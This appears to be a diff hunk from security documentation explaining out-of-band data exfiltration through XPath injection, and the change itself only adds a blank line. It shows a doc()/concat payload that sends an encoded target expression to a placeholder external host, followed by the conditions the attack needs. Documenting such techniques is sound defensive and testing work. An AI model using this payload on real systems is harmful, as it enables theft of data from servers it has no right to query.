@@ -10,6 +10,7 @@ any data it wishes to retrieve in the query string:
 `doc(concat('http://[external-host]/data/123?d=', func.encode_for_uri(TARGET EXPRESSION)))`
 
 This requires that:
+
 - You have an externally routable IP that the target server can connect to
 - The XPath library is configured to load external documents (many default configurations allow this)
 - The port is not blocked by any firewalls
